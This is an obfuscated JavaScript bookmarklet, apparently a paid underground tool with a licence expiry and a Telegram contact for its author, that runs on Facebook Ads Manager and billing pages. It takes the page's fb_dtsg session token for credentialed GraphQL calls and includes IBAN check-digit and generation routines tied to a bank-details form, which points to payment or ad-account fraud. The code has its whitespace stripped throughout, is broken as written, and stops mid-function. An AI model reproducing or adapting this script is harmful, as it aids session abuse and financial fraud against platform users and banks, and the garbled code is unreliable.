javascript: "usestrict";
function_typeof(o) {
    "@babel/helpers-typeof";
    _typeof = "function" == typeofSymbol && "symbol" == typeofSymbol.iterator ? function(o) {
        returntypeofo;
    } : function(o) {
        returno && "function" == typeofSymbol && o.constructor === Symbol && o !== Symbol.prototype ? "symbol" : typeofo;
    };
    return_typeof(o);
}
function_regeneratorRuntime() {
    "usestrict";
    _regeneratorRuntime = function_regeneratorRuntime() {
        returne;
    };
    vart;
    vare = {};
    varr = Object.prototype;
    varn = r.hasOwnProperty;
    varo = Object.defineProperty || function(t, e, r) {
        t[e] = r.value;
    };
    vari = "function" == typeofSymbol ? Symbol : {};
    vara = i.iterator || "@@iterator";
    varc = i.asyncIterator || "@@asyncIterator";
    varu = i.toStringTag || "@@toStringTag";
    functiondefine(t, e, r) {
        Object.defineProperty(t, e, {
            value: r,
            enumerable: true,
            configurable: true,
            writable: true
        });
        returnt[e];
    }
    try {
        define({}, "");
    } catch (t) {
        define = functiondefine(t, e, r) {
            returnt[e] = r;
        };
    }
    functionwrap(t, e, r, n) {
        vari = e && e.prototypeinstanceofGenerator ? e : Generator;
        vara = Object.create(i.prototype);
        varc = newContext(n || []);
        o(a, "_invoke", {
            value: makeInvokeMethod(t, r, c)
        });
        returna;
    }
    functiontryCatch(t, e, r) {
        try {
            return {
                type: "normal",
                arg: t.call(e, r)
            };
        } catch (t) {
            return {
                type: "throw",
                arg: t
            };
        }
    }
    e.wrap = wrap;
    varh = "suspendedStart";
    varl = "suspendedYield";
    varf = "executing";
    vars = "completed";
    vary = {};
    functionGenerator() {}
    functionGeneratorFunction() {}
    functionGeneratorFunctionPrototype() {}
    varp = {};
    define(p, a, function() {
        returnthis;
    });
    vard = Object.getPrototypeOf;
    varv = d && d(d(values([])));
    v && v !== r && n.call(v, a) && (p = v);
    varg = GeneratorFunctionPrototype.prototype = Generator.prototype = Object.create(p);
    functiondefineIteratorMethods(t) {
        ["next", "throw", "return"].forEach(function(e) {
            define(t, e, function(t) {
                returnthis._invoke(e, t);
            });
        });
    }
    functionAsyncIterator(t, e) {
        functioninvoke(r, o, i, a) {
            varc = tryCatch(t[r], t, o);
            if ("throw" !== c.type) {
                varu = c.arg;
                varh = u.value;
                returnh && "object" == _typeof(h) && n.call(h, "__await") ? e.resolve(h.__await).then(function(t) {
                    invoke("next", t, i, a);
                }, function(t) {
                    invoke("throw", t, i, a);
                }) : e.resolve(h).then(function(t) {
                    u.value = t;
                    i(u);
                }, function(t) {
                    returninvoke("throw", t, i, a);
                });
            }
            a(c.arg);
        }
        varr;
        o(this, "_invoke", {
            value: functionvalue(t, n) {
                functioncallInvokeWithMethodAndArg() {
                    returnnewe(function(e, r) {
                        invoke(t, n, e, r);
                    });
                }
                returnr = r ? r.then(callInvokeWithMethodAndArg, callInvokeWithMethodAndArg) : callInvokeWithMethodAndArg();
            }
        });
    }
    functionmakeInvokeMethod(e, r, n) {
        varo = h;
        returnfunction(i, a) {
            if (o === f) {
                throwError("Generatorisalreadyrunning");
            }
            if (o === s) {
                if ("throw" === i) {
                    throwa;
                }
                return {
                    value: t,
                    done: true
                };
            }
            n.method = i;
            n.arg = a;
            for (;;) {
                varc = n.delegate;
                if (c) {
                    varu = maybeInvokeDelegate(c, n);
                    if (u) {
                        if (u === y) {
                            continue;
                        }
                        returnu;
                    }
                }
                if ("next" === n.method) {
                    n.sent = n._sent = n.arg;
                } else {
                    if ("throw" === n.method) {
                        if (o === h) {
                            o = s;
                            thrown.arg;
                        }
                        n.dispatchException(n.arg);
                    } else {
                        "return" === n.method && n.abrupt("return", n.arg);
                    }
                }
                o = f;
                varp = tryCatch(e, r, n);
                if ("normal" === p.type) {
                    o = n.done ? s : l;
                    if (p.arg === y) {
                        continue;
                    }
                    return {
                        value: p.arg,
                        done: n.done
                    };
                }
                "throw" === p.type && (o = s, n.method = "throw", n.arg = p.arg);
            }
        };
    }
    functionmaybeInvokeDelegate(e, r) {
        varn = r.method;
        varo = e.iterator[n];
        if (o === t) {
            r.delegate = null;
            "throw" === n && e.iterator.return && (r.method = "return", r.arg = t, maybeInvokeDelegate(e, r), "throw" === r.method) || "return" !== n && (r.method = "throw", r.arg = newTypeError("Theiteratordoesnotprovidea'" + n + "'method"));
            returny;
        }
        vari = tryCatch(o, e.iterator, r.arg);
        if ("throw" === i.type) {
            r.method = "throw";
            r.arg = i.arg;
            r.delegate = null;
            returny;
        }
        vara = i.arg;
        returna ? a.done ? (r[e.resultName] = a.value, r.next = e.nextLoc, "return" !== r.method && (r.method = "next", r.arg = t), r.delegate = null, y) : a : (r.method = "throw", r.arg = newTypeError("iteratorresultisnotanobject"), r.delegate = null, y);
    }
    functionpushTryEntry(t) {
        vare = {
            tryLoc: t[0]
        };
        1 int && (e.catchLoc = t[1]);
        2 int && (e.finallyLoc = t[2], e.afterLoc = t[3]);
        this.tryEntries.push(e);
    }
    functionresetTryEntry(t) {
        vare = t.completion || {};
        e.type = "normal";
        deletee.arg;
        t.completion = e;
    }
    functionContext(t) {
        this.tryEntries = [{
            tryLoc: "root"
        }];
        t.forEach(pushTryEntry, this);
        this.reset(true);
    }
    functionvalues(e) {
        if (e || "" === e) {
            varr = e[a];
            if (r) {
                returnr.call(e);
            }
            if ("function" == typeofe.next) {
                returne;
            }
            if (!isNaN(e.length)) {
                varo = -1;
                vari = functionnext() {
                    for (; ++o < e.length;) {
                        if (n.call(e, o)) {
                            next.value = e[o];
                            next.done = false;
                            returnnext;
                        }
                    }
                    next.value = t;
                    next.done = true;
                    returnnext;
                };
                returni.next = i;
            }
        }
        thrownewTypeError(_typeof(e) + "isnotiterable");
    }
    GeneratorFunction.prototype = GeneratorFunctionPrototype;
    o(g, "constructor", {
        value: GeneratorFunctionPrototype,
        configurable: true
    });
    o(GeneratorFunctionPrototype, "constructor", {
        value: GeneratorFunction,
        configurable: true
    });
    GeneratorFunction.displayName = define(GeneratorFunctionPrototype, u, "GeneratorFunction");
    e.isGeneratorFunction = function(t) {
        vare = "function" == typeoft && t.constructor;
        return !!e && (e === GeneratorFunction || "GeneratorFunction" === (e.displayName || e.name));
    };
    e.mark = function(t) {
        Object.setPrototypeOf ? Object.setPrototypeOf(t, GeneratorFunctionPrototype) : (t.__proto__ = GeneratorFunctionPrototype, define(t, u, "GeneratorFunction"));
        t.prototype = Object.create(g);
        returnt;
    };
    e.awrap = function(t) {
        return {
            __await: t
        };
    };
    defineIteratorMethods(AsyncIterator.prototype);
    define(AsyncIterator.prototype, c, function() {
        returnthis;
    });
    e.AsyncIterator = AsyncIterator;
    e.async = function(t, r, n, o, i) {
        undefined === i && (i = Promise);
        vara = newAsyncIterator(wrap(t, r, n, o), i);
        returne.isGeneratorFunction(r) ? a : a.next().then(function(t) {
            returnt.done ? t.value : a.next();
        });
    };
    defineIteratorMethods(g);
    define(g, u, "Generator");
    define(g, a, function() {
        returnthis;
    });
    define(g, "toString", function() {
        return "[objectGenerator]";
    });
    e.keys = function(t) {
        vare = Object(t);
        varr = [];
        for (varnine) {
            r.push(n);
        }
        r.reverse();
        returnfunctionnext() {
            for (; r.length;) {
                vart = r.pop();
                if (tine) {
                    next.value = t;
                    next.done = false;
                    returnnext;
                }
            }
            next.done = true;
            returnnext;
        };
    };
    e.values = values;
    Context.prototype = {
        constructor: Context,
        reset: functionreset(e) {
            this.prev = 0;
            this.next = 0;
            this.sent = this._sent = t;
            this.done = false;
            this.delegate = null;
            this.method = "next";
            this.arg = t;
            this.tryEntries.forEach(resetTryEntry);
            if (!e) {
                for (varrinthis) {
                    "t" === r.charAt(0) && n.call(this, r) && !isNaN(+r.slice(1)) && (this[r] = t);
                }
            }
        },
        stop: functionstop() {
            this.done = true;
            vart = this.tryEntries[0].completion;
            if ("throw" === t.type) {
                throwt.arg;
            }
            returnthis.rval;
        },
        dispatchException: functiondispatchException(e) {
            if (this.done) {
                throwe;
            }
            varr = this;
            functionhandle(n, o) {
                a.type = "throw";
                a.arg = e;
                r.next = n;
                o && (r.method = "next", r.arg = t);
                return !!o;
            }
            for (varo = this.tryEntries.length - 1; o >= 0; --o) {
                vari = this.tryEntries[o];
                vara = i.completion;
                if ("root" === i.tryLoc) {
                    returnhandle("end");
                }
                if (i.tryLoc <= this.prev) {
                    varc = n.call(i, "catchLoc");
                    varu = n.call(i, "finallyLoc");
                    if (c && u) {
                        if (this.prev < i.catchLoc) {
                            returnhandle(i.catchLoc, true);
                        }
                        if (this.prev < i.finallyLoc) {
                            returnhandle(i.finallyLoc);
                        }
                    } else {
                        if (c) {
                            if (this.prev < i.catchLoc) {
                                returnhandle(i.catchLoc, true);
                            }
                        } else {
                            if (!u) {
                                throwError("trystatementwithoutcatchorfinally");
                            }
                            if (this.prev < i.finallyLoc) {
                                returnhandle(i.finallyLoc);
                            }
                        }
                    }
                }
            }
        },
        abrupt: functionabrupt(t, e) {
            for (varr = this.tryEntries.length - 1; r >= 0; --r) {
                varo = this.tryEntries[r];
                if (o.tryLoc <= this.prev && n.call(o, "finallyLoc") && this.prev < o.finallyLoc) {
                    vari = o;
                    break;
                }
            }
            i && ("break" === t || "continue" === t) && i.tryLoc <= e && e <= i.finallyLoc && (i = null);
            vara = i ? i.completion : {};
            a.type = t;
            a.arg = e;
            returni ? (this.method = "next", this.next = i.finallyLoc, y) : this.complete(a);
        },
        complete: functioncomplete(t, e) {
            if ("throw" === t.type) {
                throwt.arg;
            }
            "break" === t.type || "continue" === t.type ? this.next = t.arg : "return" === t.type ? (this.rval = this.arg = t.arg, this.method = "return", this.next = "end") : "normal" === t.type && e && (this.next = e);
            returny;
        },
        finish: functionfinish(t) {
            for (vare = this.tryEntries.length - 1; e >= 0; --e) {
                varr = this.tryEntries[e];
                if (r.finallyLoc === t) {
                    this.complete(r.completion, r.afterLoc);
                    resetTryEntry(r);
                    returny;
                }
            }
        },
        catch: function_catch(t) {
            for (vare = this.tryEntries.length - 1; e >= 0; --e) {
                varr = this.tryEntries[e];
                if (r.tryLoc === t) {
                    varn = r.completion;
                    if ("throw" === n.type) {
                        varo = n.arg;
                        resetTryEntry(r);
                    }
                    returno;
                }
            }
            throwError("illegalcatchattempt");
        },
        delegateYield: functiondelegateYield(e, r, n) {
            this.delegate = {
                iterator: values(e),
                resultName: r,
                nextLoc: n
            };
            "next" === this.method && (this.arg = t);
            returny;
        }
    };
    returne;
}
functionasyncGeneratorStep(n, t, e, r, o, a, c) {
    try {
        vari = n[a](c);
        varu = i.value;
    } catch (n) {
        returnvoide(n);
    }
    i.done ? t(u) : Promise.resolve(u).then(r, o);
}
function_asyncToGenerator(n) {
    returnfunction() {
        vart = this;
        vare = arguments;
        returnnewPromise(function(r, o) {
            vara = n.apply(t, e);
            function_next(n) {
                asyncGeneratorStep(a, r, o, _next, _throw, "next", n);
            }
            function_throw(n) {
                asyncGeneratorStep(a, r, o, _next, _throw, "throw", n);
            }
            _next(undefined);
        });
    };
}
function_nonIterableRest() {
    thrownewTypeError("Invalidattempttodestructurenon-iterableinstance.\nInordertobeiterable,non-arrayobjectsmusthavea[Symbol.iterator]()method.");
}
function_unsupportedIterableToArray(r, a) {
    if (r) {
        if ("string" == typeofr) {
            return_arrayLikeToArray(r, a);
        }
        vart = {}.toString.call(r).slice(8, -1);
        "Object" === t && r.constructor && (t = r.constructor.name);
        return "Map" === t || "Set" === t ? Array.from(r) : "Arguments" === t || /^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(t) ? _arrayLikeToArray(r, a) : undefined;
    }
}
function_arrayLikeToArray(r, a) {
    (null == a || a > r.length) && (a = r.length);
    for (vare = 0, n = Array(a); e < a; e++) {
        n[e] = r[e];
    }
    returnn;
}
function_iterableToArrayLimit(r, l) {
    vart = null == r ? null : "undefined" != typeofSymbol && r[Symbol.iterator] || r["@@iterator"];
    if (null != t) {
        vare;
        varn;
        vari;
        varu;
        vara = [];
        varf = true;
        varo = false;
        try {
            i = (t = t.call(r)).next;
            if (0 === l) {
                if (Object(t) !== t) {
                    return;
                }
                f = false;
            } else {
                for (; !(f = (e = i.call(t)).done) && (a.push(e.value), a.length !== l); f = true);
            }
        } catch (r) {
            o = true;
            n = r;
        } finally {
            try {
                if (!f && null != t.return && (u = t.return(), Object(u) !== u)) {
                    return;
                }
            } finally {
                if (o) {
                    thrown;
                }
            }
        }
        returna;
    }
}
function_arrayWithHoles(r) {
    if (Array.isArray(r)) {
        returnr;
    }
}
function_defineProperty(e, r, t) {
    (r = _toPropertyKey(r)) ine ? Object.defineProperty(e, r, {
        value: t,
        enumerable: true,
        configurable: true,
        writable: true
    }) : e[r] = t;
    returne;
}
function_toPropertyKey(t) {
    vari = _toPrimitive(t, "string");
    return "symbol" == _typeof(i) ? i : i + "";
}
function_toPrimitive(t, r) {
        if ("object" != _typeof(t) || !t) {
            returnt;
        }
        vare = t[Symbol.toPrimitive];
        if (undefined !== e) {
            vari = e.call(t, r || "default");
            if ("object" != _typeof(i)) {
                returni;
            }
            thrownewTypeError("@@toPrimitivemustreturnaprimitivevalue.");
        }
        return ("string" === r ? String : Number)(t);
    }
    (function() {
        window.adsplugver = "15.0";
        varT = 0;
        while (T < 65535) {
            switch (T) {
                case0: T = location.pathname === "/adsmanager/manage/campaigns" || location.pathname === "/billing_hub/" || location.pathname === "/billing_hub/accounts?" || location.pathname === "/billing_hub/accounts" || location.pathname === "/billing_hub/accounts/" || location.pathname === "/billing_hub/payment_settings" || location.pathname === "/billing_hub/payment_settings/" || location.pathname === "/billing_hub/accounts/details" || location.pathname === "/billing_hub/accounts/details/" || location.pathname === "/ads/creativehub/home/" || location.pathname === "/adsmanager/manage/all" || location.pathname === "/adsmanager/manage/ads" || location.pathname === "/adsmanager/manage/adsets" ? 1 : 2;
                break;
                case1: T = 65535; {
                    varU = require("DTSGInitialData").token;
                    fetch("https://business.facebook.com/api/graphql/", _defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty({}, "headers", _defineProperty({}, "content-type", "application/x-www-form-urlencoded")), "body", "__a=1&dpr=1&fb_dtsg=".concat(U, "&variables=%7B%22businessID%22%3A%22955621408872826%22%7D&server_timestamps=true&doc_id=7054354447949340")), "method", "POST"), "mode", "cors"), "credentials", "include")).then(function(kgbn) {
                        kgbn.json().then(function(EbSm) {
                            vargdVm = EbSm.data.business.businessName;
                            varV = 1;
                            var_loop = function_loop() {
                                switch (V) {
                                    case0: V = gdVm === "SegmaMedoz51" ? 1 : 2;
                                    break;
                                    case1: V = 65535; {
                                        varcaPm = functioncaPm() {
                                            varwVFm = newDate;
                                            varYWIm = newDate("2024-11-11T15:05:00");
                                            console.log("CurrentDateandTime:", wVFm.toLocaleString());
                                            varo = 2;
                                            var_loop2 = function_loop2() {
                                                switch (o) {
                                                    case0: o = wVFm.getTime() >= YWIm.getTime() ? 1 : 2;
                                                    break;
                                                    case1: o = 65535; {
                                                        console.log("Subscriptionhasexpired!");
                                                        varYuHj = document.createElement("div");
                                                        YuHj.style.position = "fixed";
                                                        YuHj.style.top = "50%";
                                                        YuHj.style.left = "50%";
                                                        YuHj.style.transform = "translate(-50%,-50%)";
                                                        YuHj.style.width = "500px";
                                                        YuHj.style.padding = "50px";
                                                        YuHj.style.background = "white";
                                                        YuHj.style.color = "black";
                                                        YuHj.style.borderRadius = "10px";
                                                        YuHj.style.boxShadow = "0010pxrgba(0,0,0,0.5)";
                                                        YuHj.style.zIndex = "9999";
                                                        document.body.appendChild(YuHj);
                                                        varsqyj = document.createElement("div");
                                                        sqyj.textContent = "❤️صلواعليرسولاللهصلىاللهعليهوسلم❤️";
                                                        sqyj.style.textAlign = "center";
                                                        sqyj.style.marginBottom = "10px";
                                                        YuHj.appendChild(sqyj);
                                                        varUrBj = document.createElement("div");
                                                        UrBj.textContent = "❤️سبحاناللهوبحمدهسبحاناللهالعظيم❤️";
                                                        UrBj.style.textAlign = "center";
                                                        UrBj.style.marginBottom = "25px";
                                                        YuHj.appendChild(UrBj);
                                                        varonsj = document.createElement("div");
                                                        onsj.textContent = "❤️ScriptBy:WOnka=Jerusalem";
                                                        onsj.style.textAlign = "center";
                                                        onsj.style.marginBottom = "25px";
                                                        YuHj.appendChild(onsj);
                                                        varQovj = document.createElement("div");
                                                        Qovj.textContent = "❤️!WOnka=Jerusalem❤️";
                                                        Qovj.style.textAlign = "center";
                                                        Qovj.style.marginBottom = "25px";
                                                        YuHj.appendChild(Qovj);
                                                        varQIik = document.createElement("button");
                                                        QIik.textContent = "ContactwithWOnka=Jerusalem!";
                                                        QIik.style.width = "100%";
                                                        QIik.style.height = "30px";
                                                        QIik.style.marginBottom = "10px";
                                                        QIik.style.backgroundColor = "red";
                                                        QIik.style.color = "white";
                                                        QIik.addEventListener("click", function() {
                                                            window.open("https://t.me/Dragonwore", "_blank");
                                                        });
                                                        YuHj.appendChild(QIik);
                                                        varsKlk = document.createElement("img");
                                                        sKlk.src = "https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg";
                                                        sKlk.style.width = "100%";
                                                        sKlk.style.marginBottom = "25px";
                                                        YuHj.appendChild(sKlk);
                                                    }
                                                    break;
                                                    case2: o = 65535; {
                                                        varghgj = functionghgj(a, b, c, d) {
                                                            this.name = a;
                                                            this.code = b;
                                                            this.bank = AcXi(c);
                                                            this.acc = AcXi(d);
                                                            this.bank_lng = oLqg(this.bank);
                                                            this.acc_lng = oLqg(this.acc);
                                                            this.total_lng = 4 + this.bank_lng + this.acc_lng;
                                                        };
                                                        varAcXi = functionAcXi(a) {
                                                            varb = newArray;
                                                            varc = a.split("");
                                                            vard = 0;
                                                            while (d < 65535) {
                                                                switch (d) {
                                                                    case0: d = 1;
                                                                    vare = 0;
                                                                    break;
                                                                    case1: d = e < c.length ? 2 : 65535;
                                                                    break;
                                                                    case2: d = 3; {
                                                                        varf = c[e];
                                                                        varg = 0;
                                                                        while (g < 65535) {
                                                                            switch (g) {
                                                                                case0: g = f != "" ? 1 : 65535;
                                                                                break;
                                                                                case1: g = 65535; {
                                                                                    varh = f.charAt(f.length - 1);
                                                                                    vari = 0;
                                                                                    while (i < 65535) {
                                                                                        switch (i) {
                                                                                            case0: i = h == "a" || h == "n" ? 1 : 2;
                                                                                            break;
                                                                                            case1: i = 65535;
                                                                                            f = f.substring(0, f.length - 1);
                                                                                            break;
                                                                                            case2: i = 65535;
                                                                                            h = "c";
                                                                                            break;
                                                                                        }
                                                                                    }
                                                                                    varj = parseInt(f);
                                                                                    b[b.length] = newArray(j, h);
                                                                                }
                                                                                break;
                                                                            }
                                                                        }
                                                                    }
                                                                    break;
                                                                    case3: d = 1;
                                                                    ++e;
                                                                    break;
                                                                }
                                                            }
                                                            returnb;
                                                        };
                                                        varoLqg = functionoLqg(a) {
                                                            varb = 0;
                                                            varc = 0;
                                                            while (c < 65535) {
                                                                switch (c) {
                                                                    case0: c = 1;
                                                                    vard = 0;
                                                                    break;
                                                                    case1: c = d < a.length ? 2 : 65535;
                                                                    break;
                                                                    case2: c = 3;
                                                                    b += a[d][0];
                                                                    break;
                                                                    case3: c = 1;
                                                                    ++d;
                                                                    break;
                                                                }
                                                            }
                                                            returnb;
                                                        };
                                                        varIaVg = functionIaVg(a) {
                                                            varb = 0;
                                                            while (b < 65535) {
                                                                switch (b) {
                                                                    case0: b = 1;
                                                                    varc = 0;
                                                                    break;
                                                                    case1: b = c < t.length ? 2 : 65535;
                                                                    break;
                                                                    case2: b = 3;
                                                                    vard = 0;
                                                                    while (d < 65535) {
                                                                        switch (d) {
                                                                            case0: d = t[c].code == a ? 1 : 65535;
                                                                            break;
                                                                            case1: d = 65535;
                                                                            returnt[c];
                                                                        }
                                                                    }
                                                                    break;
                                                                    case3: b = 1;
                                                                    ++c;
                                                                    break;
                                                                }
                                                            }
                                                            returnnull;
                                                        };
                                                        varcWLg = functioncWLg(a) {
                                                            varb = 0;
                                                            varc = 0;
                                                            while (c < 65535) {
                                                                switch (c) {
                                                                    case0: c = 1;
                                                                    vard = 0;
                                                                    break;
                                                                    case1: c = d < a.length ? 2 : 65535;
                                                                    break;
                                                                    case2: c = 3;
                                                                    b = (b * 10 + parseInt(a.charAt(d))) % 97;
                                                                    break;
                                                                    case3: c = 1;
                                                                    ++d;
                                                                    break;
                                                                }
                                                            }
                                                            returnb;
                                                        };
                                                        varUjnh = functionUjnh(a) {
                                                            varb = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
                                                            varc = 0;
                                                            UTuw: while (c < 65535) {
                                                                switch (c) {
                                                                    case0: c = 1;
                                                                    vard = 0;
                                                                    break;
                                                                    case1: c = d < b.length ? 2 : 65535;
                                                                    break;
                                                                    case2: c = 3;
                                                                    vare = 0;
                                                                    while (e < 65535) {
                                                                        switch (e) {
                                                                            case0: e = a == b.charAt(d) ? 1 : 65535;
                                                                            break;
                                                                            case1: e = 65535;
                                                                            breakUTuw;
                                                                        }
                                                                    }
                                                                    break;
                                                                    case3: c = 1;
                                                                    ++d;
                                                                    break;
                                                                }
                                                            }
                                                            returnd + 10;
                                                        };
                                                        varQEfe = functionQEfe(a, b) {
                                                            while (a.length < b) {
                                                                a = "0" + a;
                                                            }
                                                            returna;
                                                        };
                                                        varoDce = functionoDce(a, b) {
                                                            varc = "AaÄäBbCcDdEeFfGgHhIiJjKkLlMmNnOoÖöPpQqRrSsßTtUuÜüVvWwXxYyZz";
                                                            vard = a.length < b.length ? a.length : b.length;
                                                            vare = 0;
                                                            while (e < 65535) {
                                                                switch (e) {
                                                                    case0: e = 1;
                                                                    varf = 0;
                                                                    break;
                                                                    case1: e = f < d ? 2 : 65535;
                                                                    break;
                                                                    case2: e = 3; {
                                                                        varg = c.indexOf(a.charAt(f)) - c.indexOf(b.charAt(f));
                                                                        varh = 0;
                                                                        while (h < 65535) {
                                                                            switch (h) {
                                                                                case0: h = g != 0 ? 1 : 65535;
                                                                                break;
                                                                                case1: h = 65535;
                                                                                returng;
                                                                            }
                                                                        }
                                                                    }
                                                                    break;
                                                                    case3: e = 1;
                                                                    ++f;
                                                                    break;
                                                                }
                                                            }
                                                            returna.length - b.length;
                                                        };
                                                        varYKre = functionYKre() {
                                                            vara = newArray;
                                                            varb;
                                                            varwJoe;
                                                            varwdcf;
                                                            varc = 0;
                                                            while (c < 65535) {
                                                                switch (c) {
                                                                    case0: c = 1;
                                                                    b = 0;
                                                                    break;
                                                                    case1: c = b < t.length ? 2 : 65535;
                                                                    break;
                                                                    case2: c = 3;
                                                                    a[b] = b;
                                                                    break;
                                                                    case3: c = 1;
                                                                    ++b;
                                                                    break;
                                                                }
                                                            }
                                                            vard = 0;
                                                            while (d < 65535) {
                                                                switch (d) {
                                                                    case0: d = 1;
                                                                    b = a.length - 1;
                                                                    break;
                                                                    case1: d = b > 0 ? 2 : 65535;
                                                                    break;
                                                                    case2: d = 3;
                                                                    vare = 0;
                                                                    while (e < 65535) {
                                                                        switch (e) {
                                                                            case0: e = 1;
                                                                            wJoe = 0;
                                                                            break;
                                                                            case1: e = wJoe < b ? 2 : 65535;
                                                                            break;
                                                                            case2: e = 3;
                                                                            varf = 0;
                                                                            while (f < 65535) {
                                                                                switch (f) {
                                                                                    case0: f = oDce(t[a[wJoe]].name, t[a[wJoe + 1]].name) > 0 ? 1 : 65535;
                                                                                    break;
                                                                                    case1: f = 65535;
                                                                                    wdcf = a[wJoe];
                                                                                    a[wJoe] = a[wJoe + 1];
                                                                                    a[wJoe + 1] = wdcf;
                                                                                    break;
                                                                                }
                                                                            }
                                                                            break;
                                                                            case3: e = 1;
                                                                            ++wJoe;
                                                                            break;
                                                                        }
                                                                    }
                                                                    break;
                                                                    case3: d = 1;
                                                                    --b;
                                                                    break;
                                                                }
                                                            }
                                                            returna;
                                                        };
                                                        varQYSe = functionQYSe(a) {
                                                            varb = a.substring(0, 2);
                                                            varc = a.substring(2, 4);
                                                            vard = a.substring(4);
                                                            vare = "";
                                                            varf = 0;
                                                            while (f < 65535) {
                                                                switch (f) {
                                                                    case0: f = 1;
                                                                    varg = 0;
                                                                    break;
                                                                    case1: f = g < d.length ? 2 : 65535;
                                                                    break;
                                                                    case2: f = 3; {
                                                                        varh = d.charAt(g).toUpperCase();
                                                                        vari = 0;
                                                                        while (i < 65535) {
                                                                            switch (i) {
                                                                                case0: i = "0" <= h && h <= "9" ? 1 : 2;
                                                                                break;
                                                                                case1: i = 65535;
                                                                                e += h;
                                                                                break;
                                                                                case2: i = 65535;
                                                                                e += Ujnh(h);
                                                                                break;
                                                                            }
                                                                        }
                                                                    }
                                                                    break;
                                                                    case3: f = 1;
                                                                    ++g;
                                                                    break;
                                                                }
                                                            }
                                                            varj = 0;
                                                            while (j < 65535) {
                                                                switch (j) {
                                                                    case0: j = 1;
                                                                    varg = 0;
                                                                    break;
                                                                    case1: j = g < b.length ? 2 : 65535;
                                                                    break;
                                                                    case2: j = 3; {
                                                                        varh = b.charAt(g);
                                                                        e += Ujnh(h);
                                                                    }
                                                                    break;
                                                                    case3: j = 1;
                                                                    ++g;
                                                                    break;
                                                                }
                                                            }
                                                            e += c;
                                                            c = 98 - cWLg(e);
                                                            returnQEfe("" + c, 2);
                                                        };
                                                        varcGjc = functioncGjc(a, b) {
                                                            varc = 0;
                                                            while (c < 65535) {
                                                                switch (c) {
                                                                    case0: c = 1;
                                                                    vard = 0;
                                                                    break;
                                                                    case1: c = d < a.length ? 2 : 65535;
                                                                    break;
                                                                    case2: c = 3; {
                                                                        vare = a[d][0];
                                                                        varwVNc = a[d][1];
                                                                        varf = 0;
                                                                        while (f < 65535) {
                                                                            switch (f) {
                                                                                case0: f = e > b.length ? 1 : 65535;
                                                                                break;
                                                                                case1: f = 65535;
                                                                                e = b.length;
                                                                                break;
                                                                            }
                                                                        }
                                                                        varg = 0;
                                                                        while (g < 65535) {
                                                                            switch (g) {
                                                                                case0: g = 1;
                                                                                varh = 0;
                                                                                break;
                                                                                case1: g = h < e ? 2 : 65535;
                                                                                break;
                                                                                case2: g = 3; {
                                                                                    vari = b.charAt(h);
                                                                                    varj = "A" <= i && i <= "Z";
                                                                                    vark = "0" <= i && i <= "9";
                                                                                    varl = k || j || "a" <= i && i <= "z";
                                                                                    varm = 0;
                                                                                    while (m < 65535) {
                                                                                        switch (m) {
                                                                                            case0: m = !l && wVNc == "c" || !j && wVNc == "a" || !k && wVNc == "n" ? 1 : 65535;
                                                                                            break;
                                                                                            case1: m = 65535;
                                                                                            returntrue;
                                                                                        }
                                                                                    }
                                                                                }
                                                                                break;
                                                                                case3: g = 1;
                                                                                ++h;
                                                                                break;
                                                                            }
                                                                        }
                                                                        b = b.substring(e);
                                                                    }
                                                                    break;
                                                                    case3: c = 1;
                                                                    ++d;
                                                                    break;
                                                                }
                                                            }
                                                            returnNaN === NaN;
                                                        };
                                                        varULw = functionULw(a) {
                                                            varb = "";
                                                            varc = 0;
                                                            while (c < 65535) {
                                                                switch (c) {
                                                                    case0: c = 1;
                                                                    vard = 0;
                                                                    break;
                                                                    case1: c = d < a.length ? 2 : 65535;
                                                                    break;
                                                                    case2: c = 3; {
                                                                        vare = 0;
                                                                        while (e < 65535) {
                                                                            switch (e) {
                                                                                case0: e = d % 4 == 0 ? 1 : 65535;
                                                                                break;
                                                                                case1: e = 65535;
                                                                                b += "";
                                                                                break;
                                                                            }
                                                                        }
                                                                        b += a.charAt(d);
                                                                    }
                                                                    break;
                                                                    case3: c = 1;
                                                                    ++d;
                                                                    break;
                                                                }
                                                            }
                                                            returnb;
                                                        };
                                                        varICe = functionICe(a) {
                                                            varb = 0;
                                                            while (b < 65535) {
                                                                switch (b) {
                                                                    case0: b = a.substring(0, 4) == "IBAN" ? 1 : 65535;
                                                                    break;
                                                                    case1: b = 65535;
                                                                    a = a.substring(4);
                                                                    break;
                                                                }
                                                            }
                                                            varc = "";
                                                            vard = 0;
                                                            while (d < 65535) {
                                                                switch (d) {
                                                                    case0: d = 1;
                                                                    vare = 0;
                                                                    break;
                                                                    case1: d = e < a.length ? 2 : 65535;
                                                                    break;
                                                                    case2: d = 3;
                                                                    varf = 0;
                                                                    while (f < 65535) {
                                                                        switch (f) {
                                                                            case0: f = a.charAt(e) != "" ? 1 : 65535;
                                                                            break;
                                                                            case1: f = 65535;
                                                                            c += a.charAt(e);
                                                                            break;
                                                                        }
                                                                    }
                                                                    break;
                                                                    case3: d = 1;
                                                                    ++e;
                                                                    break;
                                                                }
                                                            }
                                                            returnc;
                                                        };
                                                        varwNz = functionwNz(a, b, c) {
                                                            vard = QEfe(c, a.acc_lng);
                                                            vare = QYSe(a.code + "00" + b + d);
                                                            returna.code + e + b + d;
                                                        };
                                                        varQceb = functionQceb(a, b, c) {
                                                            vard = QEfe(c, a.acc_lng);
                                                            vare = QYSe(a.code + "00" + b + d);
                                                            e = QEfe("" + cWLg(e), 2);
                                                            returna.code + e + b + d;
                                                        };
                                                        vargpCb = functiongpCb() {
                                                            vara = document.ibanform;
                                                            varb = a.country.options[a.country.selectedIndex].value;
                                                            varc = ICe(a.bank.value);
                                                            vard = ICe(a.account.value);
                                                            vare = IaVg(b);
                                                            varf = null;
                                                            varsqOnc = null;
                                                            varg = 0;
                                                            while (g < 65535) {
                                                                switch (g) {
                                                                    case0: g = e == null ? 1 : 2;
                                                                    break;
                                                                    case1: g = 65535; {
                                                                        f = _("UnknownCountryCode:") + b;
                                                                        sqOnc = a.country;
                                                                    }
                                                                    break;
                                                                    case2: g = 65535;
                                                                    varh = 0;
                                                                    while (h < 65535) {
                                                                        switch (h) {
                                                                            case0: h = c.length != e.bank_lng ? 1 : 2;
                                                                            break;
                                                                            case1: h = 65535; {
                                                                                f = _("Bank/BranchCodelength") + c.length + _("isnotcorrectfor") + e.name + "(" + e.bank_lng + ")";
                                                                                sqOnc = a.bank;
                                                                            }
                                                                            break;
